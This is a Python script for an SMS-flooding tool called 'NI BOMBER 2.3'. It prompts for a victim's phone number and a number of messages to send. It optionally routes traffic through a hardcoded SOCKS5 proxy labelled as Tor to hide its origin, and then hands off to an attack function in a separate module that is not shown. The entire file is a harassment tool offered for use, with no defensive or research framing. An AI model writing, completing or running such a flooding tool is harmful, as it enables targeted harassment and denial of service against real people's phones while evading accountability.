import requests
import datetime
import services

#colours
class color:
	Green = '\033[92m'
	Cyan = '\033[95m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'
	END = '\033[0m'
	Red = '\033[91m'

#header
print(color.Green + color.BOLD + '         ' + color.UNDERLINE + '[NI BOMBER 2.3]' + color.END)

print()
print(color.BOLD + "coded by" + color.END, end = "")
print(color.Green + color.BOLD + " >> " + color.END, end = "")
print(color.Cyan + color.BOLD + "nikait" + color.END)

print(color.BOLD +  "telegram" + color.END, end = "")
print(color.Green + color.BOLD + " >> " + color.END, end = "")
print(color.Cyan + color.BOLD + "@aaanikit" + color.END)
print()

#inputs
print('enter the number without prefixes\nexample: 9018017010')
number = input(color.Green + color.BOLD + '>> ' + color.END)
print('how many sms to send?')
sms = int(input(color.Green + color.BOLD + '>> ' + color.END))

print("you need a" + color.Cyan + " tor " + color.END + "y/n? ")
is_tor = input(color.BOLD + color.Green + ">> " + color.END)


def check_number(number):
	if int(len(number)) == 10 and int(number[0]) == 9:
		print('[*]check number -' + color.Green + color.BOLD + ' OK' + color.END)
	else:
		print('[*]check number -' + color.Red + color.BOLD + ' failed number!' + color.END)
		quit()
check_number(number)


#tor
if str(is_tor) == "y":
        print('[*]launch ' + color.Cyan + color.BOLD + 'Tor' + color.END + '...')
        proxies = {'http': 'socks5://139.59.53.105:1080','https': 'socks5://139.59.53.105:1080'}
        tor = requests.get('http://icanhazip.com/', proxies=proxies).text
        tor = (tor.replace('\n',''))
        print('[*]launch ' + color.Cyan + color.BOLD + 'Tor' + color.END + ' - ' +  color.Green + color.BOLD + 'OK' + color.END)

services.attack(number, sms)
